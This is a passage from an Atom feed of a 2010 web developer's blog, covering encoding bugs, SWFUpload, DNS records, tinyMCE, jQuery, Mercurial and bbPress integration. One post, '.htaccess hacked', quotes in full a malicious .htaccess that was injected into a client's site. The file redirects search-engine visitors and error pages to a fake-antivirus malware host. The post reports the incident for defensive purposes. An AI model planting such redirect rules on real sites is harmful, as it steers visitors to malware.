&lt;p&gt;All the videos I&amp;#39;ve uploaded to their service from October 2009 until January
10th 2010 are working correctly.&lt;/p&gt;

&lt;p&gt;But for every video uploaded after that (in fact, from January 24th as far as
I can tell), the description text gets corrupted. All the special characters
(like Ã© or â¬) gets replaced by their un-encoded counterparts (like ÃÂ©).&lt;/p&gt;

&lt;p&gt;It happens either when using their API from a distant server or using their
homemade simple uploader.&lt;/p&gt;

&lt;p&gt;Even &amp;quot;worse&amp;quot;, when retrieving the video details from their API the description
field gets &amp;quot;htmlspecialchared&amp;quot; and I end up dealing with &amp;Atilde;&amp;copy;&lt;/p&gt;

&lt;p&gt;Anyway, I send them an email about that. I&amp;#39;ve had to contact Viddler support
in the past and they are quite responsive, so I&amp;#39;m sure they will correct this
in no time, seing how trivial it is (in fact, the title field is not affected
by this bug).&lt;/p&gt;

&lt;p&gt;Update 29th March : Viddler support filed a ticket for the issue.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Extra GET request when using SWFUpload</title>
   <link href="http://blog.pixelastic.com/2010/03/25/extra-get-request-when-using-swfupload/"/>
   <updated>2010-03-25T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/25/extra-get-request-when-using-swfupload</id>
   <content type="html">&lt;p&gt;I&amp;#39;ve been using &lt;a href=&quot;http://swfupload.org/&quot;&gt;SWFUpload &lt;/a&gt;for quite a long time now.
Put simply, it&amp;#39;s a Flash/Javascript plugin allowing a file upload to be done
without having to submit the page.&lt;/p&gt;

&lt;p&gt;Basically it uses the streaming upload capacity of flash to fire javascript
events to tell the developer the upload percentage, do some filesize and
filetype checks, etc.&lt;/p&gt;

&lt;p&gt;If you&amp;#39;ve ever seen an upload progress bar on any website, it most surely was
done using SWFUpload.&lt;/p&gt;

&lt;p&gt;Anyway, today I spotted a strange behavior in one of my pages, heavily using
&lt;code&gt;SWFUpload&lt;/code&gt;(more or less 20 upload fields). Using the Net panel of Firebug, I
saw some strange GET requests being made to my website.&lt;/p&gt;

&lt;p&gt;After digging into my code, I could isolate the problem. I was coming from
&lt;code&gt;SWFUpload&lt;/code&gt;itself. I even found record of &lt;a href=&quot;http://code.google.com/p/swfupload/issues/detail?id=202&quot;&gt;a bug
report&lt;/a&gt; mentionning
it.&lt;/p&gt;

&lt;p&gt;In a nutshell, SWFUpload always make a request to the url specified in the
&lt;code&gt;button_image_url&lt;/code&gt; parameter, even if you haven&amp;#39;t specified one (in this case
it made a request to your webroot).&lt;/p&gt;

&lt;p&gt;I&amp;#39;m not using any image for my button, or should I say, I take care of that in
CSS already, my SWFUpload button is just an invisible Flash element,
positionned on top of my existing button.&lt;/p&gt;

&lt;p&gt;I tried setting the value to &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;false&lt;/code&gt;or an empty string, but it would
continue to do the request.&lt;/p&gt;

&lt;p&gt;Anyway, I upgraded to the latest version (2.5.0 Beta 3), and it solves my
problem. Now I&amp;#39;m just hoping that all the retro-compatibility will be kept.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Manually changing MX and CNAME resolving for Gmail</title>
   <link href="http://blog.pixelastic.com/2010/03/18/manually-changing-mx-resolving/"/>
   <updated>2010-03-18T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/18/manually-changing-mx-resolving</id>
   <content type="html">&lt;p&gt;I don&amp;#39;t usually change MX resolving, but when I do, it always almost is using
my registrar or host admin panel.&lt;/p&gt;

&lt;p&gt;When I have to manually do it, (because the website is hosted on a dedicated
server where I have to manually edit almost everything), I always waste a lot
of time understanding where to find the configuration files.&lt;/p&gt;

&lt;p&gt;Today I had to change the MX record of an existing website to use those of
Google. The server hosting the website was also defined as nameserver, so I
had to update the &lt;code&gt;/var/named/domain.tld.hosts&lt;/code&gt; file (the file may not be in
the same directory in your own server).&lt;/p&gt;

&lt;p&gt;I remove the line relative to the MX records and added those instead&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  10 ASPMX.L.GOOGLE.COM.
domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  20 ALT1.ASPMX.L.GOOGLE.COM.
domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  20 ALT2.ASPMX.L.GOOGLE.COM.
domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  30 ASPMX2.L.GOOGLE.COM.
domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  30 ASPMX3.L.GOOGLE.COM.
domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  30 ASPMX4.L.GOOGLE.COM.
domain.tld.Â Â Â  INÂ Â Â  MXÂ Â Â  30 ASPMX5.L.GOOGLE.COM.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It worked well.&lt;/p&gt;

&lt;p&gt;I also wanted to use a simple address for the webmail, like mail.domain.tld.&lt;/p&gt;

&lt;p&gt;So I added the following line&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;mail.domain.tldÂ Â Â  INÂ Â Â  CNAMEÂ Â Â  ghs.google.com.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I also updated the serial at the start of the file and rebooted my server. I
know there must be a less savage way that rebooting the server but I still
haven&amp;#39;t find it.&lt;/p&gt;

&lt;p&gt;P.S : I used this &lt;a href=&quot;http://www.google.com/support/a/bin/answer.py?hl=en&amp;amp;answer=116393&quot;&gt;google / DNS Stuff
page&lt;/a&gt; to
help me test my records all along the way&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>tinyMCE mceRemoveNode explained</title>
   <link href="http://blog.pixelastic.com/2010/03/11/tinymce-mceremovenode-explained/"/>
   <updated>2010-03-11T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/11/tinymce-mceremovenode-explained</id>
   <content type="html">&lt;p&gt;When writing my image plugin for tinyMCE today I came accross the
&lt;code&gt;mceRemoveNode&lt;/code&gt;command that one can use to alter the tinyMCE editor content.&lt;/p&gt;

&lt;p&gt;It has to be used with &lt;code&gt;editor.execCommand(&amp;#39;mceRemoveNode&amp;#39;, true/false,
node)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I don&amp;#39;t really get what the &lt;code&gt;true&lt;/code&gt;/&lt;code&gt;false&lt;/code&gt;argument was about, setting either
one or the other didn&amp;#39;t change anything (that I could tell) in my case. The
node argument is the DOM node you want to remove from the editor.&lt;/p&gt;

&lt;p&gt;At first I thought that the command would allow me to remove a node from the
editor area. I needed it in my plugin. But it was not exactly what it really
does.&lt;/p&gt;

&lt;p&gt;In fact it only removes the wrapping node, but keep the content intact. In
other words if you have&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.domain.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.domain.com/picture.jpg&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And you remove the &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; node using &lt;code&gt;mceRemoveNode&lt;/code&gt;, you&amp;#39;ll end up with&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.domain.com/picture.jpg&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;in place of your link.&lt;/p&gt;

&lt;p&gt;I had to manually (well, with the great help of jQuery) remove the content of
the link before removing it. I could have remove the node itself using jQuery
but I thought that sticking to the tinyMCE methods would be a better approach,
I don&amp;#39;t want to mess all this stuff up, maybe &amp;quot;simply&amp;quot; removing html nodes
like this could interfere with the &lt;code&gt;textarea&lt;/code&gt;value update, I don&amp;#39;t know. And
in doubt, I prefer to use the methods and command exposed by the API&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Setting content-type in link attributes</title>
   <link href="http://blog.pixelastic.com/2010/03/11/setting-content-type-in-link-attributes/"/>
   <updated>2010-03-11T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/11/setting-content-type-in-link-attributes</id>
   <content type="html">&lt;p&gt;Reading a &lt;a href=&quot;http://forum.alsacreations.com/topic-9-47144-3-Debat--URL-%0ARewriting-avec-ou-sans-ID-.html#p332138&quot;&gt;comment on
AlsacrÄÅ ations&lt;/a&gt;, I&amp;#39;ve discovered that there is a
&lt;a href=&quot;http://www.w3.org/TR/html401/struct/links.html#adef-type-A&quot;&gt;type attribute&lt;/a&gt;
defined in the link section of the HTML 4.01 spec.&lt;/p&gt;

&lt;p&gt;In a nutshell, it&amp;#39;s an optional attribute that one can add to a &lt;a&gt; tag to
tell the browser the content type it is supposed to receive if following the
link.&lt;/p&gt;

&lt;p&gt;Unfortunatly, no browser seems to be using it, but I added this support to
Caracole anyway.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Unresponding jQuery UI dialog box</title>
   <link href="http://blog.pixelastic.com/2010/03/10/unresponding-jquery-ui-dialog-box/"/>
   <updated>2010-03-10T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/10/unresponding-jquery-ui-dialog-box</id>
   <content type="html">&lt;p&gt;As this is the second time I encounter this &amp;quot;issue&amp;quot;, I think it may be clever
to post it here. At least, I won&amp;#39;t have to debug it all the down again next
time.&lt;/p&gt;

&lt;p&gt;In a nutshell, I was working on a complex UI that involve several layers of
dialog boxes, each one on top of the previous one. Each new dialog box is
supposed to offer the user something to do, and once it is done, the dialog
box disapear and the user can get back to the previous one.&lt;/p&gt;

&lt;p&gt;The &amp;quot;issues&amp;quot; I was having was after closing a specific window, I wasn&amp;#39;t able
to focus the previous one. I mean, the window was there, I was even able to
update its fields using jQuery, but I couldn&amp;#39;t focus it either using keyboard
or mouse.&lt;/p&gt;

&lt;p&gt;After some digging, it appears that I wasn&amp;#39;t correctly &amp;quot;closing&amp;quot; the previous
window. I was actually doing a &lt;code&gt;.dialog(&amp;#39;destroy&amp;#39;)&lt;/code&gt; instead of a
&lt;code&gt;.dialog(&amp;#39;close&amp;#39;)&lt;/code&gt; and this was causing my issue.&lt;/p&gt;

&lt;p&gt;Calling &lt;code&gt;close&lt;/code&gt;hides the dialog box, but keep it in the DOM. That way if I
ever need the same dialog box again, jQuery is smart enough to re-use it.&lt;/p&gt;

&lt;p&gt;Calling &lt;code&gt;destroy&lt;/code&gt;on the other hand actually remove the dialog box from the
DOM, forcing jQuery to recreate it from scrath.&lt;/p&gt;

&lt;p&gt;It appears that calling &lt;code&gt;destroy&lt;/code&gt;in my case caused a strange lose of focus,
so I reverted to close instead.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Why is my disk full ?</title>
   <link href="http://blog.pixelastic.com/2010/03/08/why-is-my-disk-full/"/>
   <updated>2010-03-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/08/why-is-my-disk-full</id>
   <content type="html">&lt;p&gt;Ok, so remember when I was writing about that client of mine who had trouble
with its SquirelMail implementation. I thought it was a problem of SquirelMail
having trouble dealing with large directories.&lt;/p&gt;

&lt;p&gt;It was not exactly that, it more was a question of the IMAP server having
issues with disk space. I made some backups of the mails, cleaned it up a
little then everything went fine.&lt;/p&gt;

&lt;p&gt;But suddenly today, the same SquirrelMail started acting funny, blocking some
login attempt telling me that the IMAP server stopped responding, or
displaying message list without subject nor owner.&lt;/p&gt;

&lt;p&gt;Tired all of this, I decided (my client) to move its whole mail system to
GMail, using the Google system, while keeping my clients domain name. To
finish the registration process at Gmail, I had to put a
googlehostedservice.html file online on the domain to prove that I am the
owner and...&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;452 Transfer aborted.Â  No space left on device
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here is what the FTP server answered. What ? No more space ? But, but, but,
but I just cleaned it all, deleting a whole 1Go log file. Wtf ?&lt;/p&gt;

&lt;p&gt;I connect to the server and got the list of the biggest files and directories
by doing a :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;find  /var -type f -ls &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sort -k 7 -r -n &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; head -10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I found that the maillog was 1.1Go... I deleted it and hurry the Gmail
activation process. Problem solved.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Quick overview of the Prestashop admin panel</title>
   <link href="http://blog.pixelastic.com/2010/03/08/quick-overview-of-the-prestashop-admin-panel/"/>
   <updated>2010-03-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/08/quick-overview-of-the-prestashop-admin-panel</id>
   <content type="html">&lt;p&gt;One of my client wants to move an old osCommerce site to a new platform.
osCommerce is really an old system, it does not handle plugins (you have to
hack the core to add functionnality), has tablefull implementation and all the
html and php code is mixed up.&lt;/p&gt;

&lt;p&gt;I decided to move it to Prestashop. Why Prestashop ? Well, obviously because
there is not that much choice on the e-commerce open source website scene
nowadays. The only other choice would have been Magento and from what I heard
it is quite a pain to install and make it running.&lt;/p&gt;

&lt;p&gt;For this project, I need to act very quickly and the new website should be up
and running in a matter of weeks. I&amp;#39;ll use either a free theme or buy one
online, but I won&amp;#39;t have time to involve a full design process in this. I&amp;#39;ll
also have to migrate the complete product, customer and image database from
one system to the other.&lt;/p&gt;

&lt;p&gt;That won&amp;#39;t be an easy task but... well... I have to do it.&lt;/p&gt;

&lt;p&gt;Anyway, before starting this whole progress I wanted to see what Prestashop
really had to offer me. I read their full feature list and hell, I even went
to there open presentation, here in Paris, when the v1.0 was realeased but
from what I&amp;#39;ve seen it was a lot of talk, a lot of features a lot of
everything but very little attention to the details.&lt;/p&gt;

&lt;p&gt;Well, after testing the demo admin panel a little bit I can say that my first
impression was correct. Prestashop seems to be able to do a lot of stuff,
really. But the way it is presented to the user is far from optimal. There are
a lot of little mistakes that make using the interface more difficult that it
should be.&lt;/p&gt;

&lt;p&gt;For example they are using icons to illustrate almost any action or link. But
sometimes the icons do not have ANY link to the action. The icon for the
&amp;quot;tags&amp;quot; section is a dark cloud, the icon for the search engines is a key is an
arrow, they use the same icons for very different actions (editing a tab and
paying with cheque). An icon is supposed to convey in a rapid and easy visual
way what is text is about, but for Prestashop it is more like &amp;quot;What is that
supposed to mean ?&amp;quot;&lt;/p&gt;

&lt;p&gt;SEO-friendly url are achieved through the use of .htaccess. Normal would you
think ? Well yep, usually. But Prestashop does that by generating a huge
.htaccess (one line for each product) and mapping each product individually.
I&amp;#39;m not really sure, and haven&amp;#39;t run benchmarks on this but I guess it forces
the server to parse the .htaccess file for each request and redirect to the
correct page. It smells like a huge performance bottleneck for me, especially
with a website using i18n and multiples urls.&lt;/p&gt;

&lt;p&gt;I would have saved the &amp;quot;slug&amp;quot; of each product (in multiple languages if
needed) in the database and accessed products only based on their id. Of
course, I would have hooked every methods that is supposed to write an html
link or any url to a special method that would create the correct url based on
the id, slug and language.&lt;/p&gt;

&lt;p&gt;They also use a default implementation of tinyMCE with a lot of useless
options (like layers, html table, etc). They also have kept the default
&amp;quot;insert image&amp;quot; implementation, asking for the image url instead of hooking a
custom image upload script, much more useful.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ll have to use that admin panel anyway. I just hop that I do not
underestimate the time needed to move the shop to this platform.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Final Fantasy XII : La faute de frappe...</title>
   <link href="http://blog.pixelastic.com/2010/03/08/final-fantasy-xii-la-faute-de-frappe/"/>
   <updated>2010-03-08T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/08/final-fantasy-xii-la-faute-de-frappe</id>
   <content type="html">&lt;p&gt;Je suis tombÃ© dessus par hasard, en quatriÃ¨me de couverture d&amp;#39;un magazine, une
pub pour FFXIII avec une belle faute de frappe imprimÃ©e Ã  des millions
d&amp;#39;exemplaires...&lt;/p&gt;

&lt;p&gt;&amp;quot;Aurez-vous le courage d&amp;#39;affonter votre destin ?&amp;quot;&lt;/p&gt;

&lt;p&gt;Affonter, oui, oui, affonter, ce qui signifie aiguiser des couteaux...&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/files/2010/03/08/4b953b03b87e7-medium.jpg&quot; alt=&quot;FFXII : Aurez-vous le courage d&amp;#39;affonter votre
des&quot;&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using nested subrepos with Mercurial and TortoiseHg</title>
   <link href="http://blog.pixelastic.com/2010/03/05/using-nested-subrepos-with-mercurial-and-tortoisehg/"/>
   <updated>2010-03-05T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/05/using-nested-subrepos-with-mercurial-and-tortoisehg</id>
   <content type="html">&lt;p&gt;Nowadays, when I&amp;#39;m developping a new website, I almost always ended using
parts and bits of the previous website I&amp;#39;ve done. All my websites are based on
the same framework (cakePHP) that I have itself updated with its own CMS
(Caracole, more on that later).&lt;/p&gt;

&lt;p&gt;Caracole is made of several little plugins, each one of them focusing on a
simple task (like handling 404 errors, adding a recycle bin, draftable
elements, SEO-friendly url, and so on).&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve also updated each one of this plugins to BitBucket, allowing me to easily
commit changes and clone new version from one project to another.&lt;/p&gt;

&lt;p&gt;But very often, when working on a specific project, using a specific plugin I
think that I can update the plugin (be it either by adding a new feature or
fixing a bug I&amp;#39;ve discovered). In that case, I want my changes to be added to
both the plugin (on BitBucket) and the project I&amp;#39;m working on at the moment.&lt;/p&gt;

&lt;p&gt;To do that, I had to struggle my way with Mercurial because nested
repositories (called subrepos) is not a trivial setup.&lt;/p&gt;

&lt;h2&gt;Setting up subrepo with Mercurial :&lt;/h2&gt;

&lt;p&gt;Let me show you the classical and easy way to achieve that :&lt;/p&gt;

&lt;p&gt;First, let&amp;#39;s say you have your main repo. You go in the directory where you
want to add your subrepo and you either create it using hg init or hg clone.&lt;/p&gt;

&lt;p&gt;You then go back to your main repo root and edit the .hgsub file (if you don&amp;#39;t
have this file yet, just create it). Add the following line to the .hgsub :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;na&quot;&gt;path/to/your/subrepo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;path/to/your/subrepo&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, on every subsequent commit Hg will be aware that your repo is holding a
new subrepo. If you omit this line, Hg will not allow you to commit
complaining about a repo inside an other repo.&lt;/p&gt;

&lt;p&gt;You can now safely commit your main repo, or your subrepo independently.&lt;/p&gt;

&lt;p&gt;Now, let&amp;#39;s see the edge case.&lt;/p&gt;

&lt;h2&gt;Changing a classical sub directory into a subrepo&lt;/h2&gt;

&lt;p&gt;The classical example above is what you can find in the Mercurial help pages.
It wasn&amp;#39;t that helpful for me because my setup was a little different and it
was causing Hg a lot of trouble.&lt;/p&gt;

&lt;p&gt;I was not creating a new subrepo, nor cloning a new one. I had sub diretcory
of my main app, that I wanted to change into a subrepo. My sub directory was
named &amp;#39;myplugin&amp;#39; and I had a repo of that name hosted on BitBucket.&lt;/p&gt;

&lt;p&gt;So I tried to delete my existing &amp;#39;myplugin&amp;#39; directory, and clone the
&amp;#39;myplugin&amp;#39; from BitBucket, edit the .hgsub and commit but Hg aborted the
operation, complaining about the repo in repo file structure.&lt;/p&gt;

&lt;p&gt;After a lot of testing, and &lt;a href=&quot;http://stackoverflow.com/questions/2371330/what-is-the-correct-way-to-%0Ahandle-nested-hg-repositories-with-mercurial-tortoiseh&quot;&gt;cry for
help&lt;/a&gt;, I finally managed to
get it to work. The workflow is almost the same, with one little new step.&lt;/p&gt;

&lt;p&gt;Deleting the &amp;#39;myplugin&amp;#39; folder wasn&amp;#39;t enough. I had to tell Mercurial to
completly remove this files from its index. Using TortoiseHg, I was able to do
that by right clicking on the folder, and then choosing &amp;#39;TortoiseHg &amp;gt; Remove
Files&amp;#39;. Then I had to commit those changes, officially telling Mercurial to
forget this files, and putting it in a state where those files aren&amp;#39;t there at
all.&lt;/p&gt;

&lt;p&gt;Then only was I able to clone my repo from BitBucket, edit the .hgsub file and
commit my main repo.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>.htaccess hacked</title>
   <link href="http://blog.pixelastic.com/2010/03/03/htaccess-hacked/"/>
   <updated>2010-03-03T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/03/03/htaccess-hacked</id>
   <content type="html">&lt;p&gt;Today a client called me telling me that its website was unavailable, or more
exactly that the full content of the FTP was displayed instead of its
homepage.&lt;/p&gt;

&lt;p&gt;After a little investigation it appears that the .htaccess file had been
modified, here was the content I found :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nb&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;400&lt;/span&gt; http://217.23.5.232/hitin.php?land=20&amp;amp;affid=20116
&lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;401&lt;/span&gt; http://217.23.5.232/hitin.php?land=20&amp;amp;affid=20116
&lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;403&lt;/span&gt; http://217.23.5.232/hitin.php?land=20&amp;amp;affid=20116
&lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;404&lt;/span&gt; http://217.23.5.232/hitin.php?land=20&amp;amp;affid=20116
&lt;span class=&quot;nb&quot;&gt;ErrorDocument&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;500&lt;/span&gt; http://217.23.5.232/hitin.php?land=20&amp;amp;affid=20116
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*google.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*ask.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*yahoo.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*excite.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*altavista.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*msn.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*netscape.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*aol.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*hotbot.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*goto.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*infoseek.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*mamma.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*alltheweb.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*lycos.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*search.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*metacrawler.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*bing.* [OR]
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_REFERER} .*dogpile.*
&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ http://217.23.5.232/hitin.php?land=20&amp;amp;affid=20116 [R=301,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A little search online told me that this IP refer to a malware website
launching a fake Antivirus software installation.&lt;/p&gt;

&lt;p&gt;I have no idea how the &lt;code&gt;.htacces&lt;/code&gt;s got modified, but I changed the FTP password.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Integration of a bbPress forum into a cakePHP application (part 4)</title>
   <link href="http://blog.pixelastic.com/2010/02/17/integration-bbpress-forum-cakephp-application-part-4/"/>
   <updated>2010-02-17T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/02/17/integration-bbpress-forum-cakephp-application-part-4</id>
   <content type="html">&lt;p&gt;We&amp;#39;re almost done. There is just one last thing we must do. We don&amp;#39;t want our
dear user to have to login twice, once for the main app and once for the form,
do we ?&lt;/p&gt;

&lt;h2&gt;Creating the Configure keys&lt;/h2&gt;

&lt;p&gt;So first, go back to your &lt;code&gt;bb-config.php&lt;/code&gt; file and if you haven&amp;#39;t already,
define the &lt;code&gt;BB_AUTH_KEY&lt;/code&gt; and &lt;code&gt;BB_LOGGED_IN_KEY&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Go to your &lt;code&gt;app/config/bootstrap.php&lt;/code&gt; and create entries in &lt;code&gt;Configure&lt;/code&gt;for
this same keys. I named mine &lt;code&gt;bbPress.authKey&lt;/code&gt; and &lt;code&gt;bbPress.logKey&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, go back to your database, open the &lt;code&gt;bb_meta&lt;/code&gt; table and find the
&lt;code&gt;bb_auth_salt&lt;/code&gt; and &lt;code&gt;bb_loggued_in_salt&lt;/code&gt; values. Copy them to two more
&lt;code&gt;Configure&lt;/code&gt;keys (&lt;code&gt;bbPress.authSalt&lt;/code&gt; and &lt;code&gt;bbPress.logSalt&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;One last key to create. Head back to &lt;code&gt;bb-config.php&lt;/code&gt; and add the following
line :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;define(&amp;#39;BB_HASH&amp;#39;, &amp;#39;XXXXX&amp;#39;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Of course, set &lt;code&gt;XXXX&lt;/code&gt; to a unique string. The name of your website should
suffice, it is just used to differenciate between cookies on the same domain.
Report the same value in &lt;code&gt;Configure&lt;/code&gt; : &lt;code&gt;bbPress.hash&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Creating the cookies&lt;/h2&gt;

&lt;p&gt;You&amp;#39;re now ready to create bbPress cookies. bbPress will need to create two
different sets of cookie.&lt;/p&gt;

&lt;p&gt;A bbPress cookie contain a value formatted like :
&lt;code&gt;&amp;lt;login&amp;gt;|&amp;lt;expiration&amp;gt;|&amp;lt;hash&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The hash is based on the user password, login, expiration and several other
keys. It also involve double hashing of the value, with different salt and key
values.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve eased the pain of understanding how to create a cookie value, just use
the following function :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function __getCookieValue($options = array()) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   // We will need the login, pass and expiration date to create the cookie&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $userLogin = $options[&amp;#39;name&amp;#39;]; // The user login&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   $userPass = $options[&amp;#39;password&amp;#39;]; // The password encrypted in the database&lt;/span&gt;
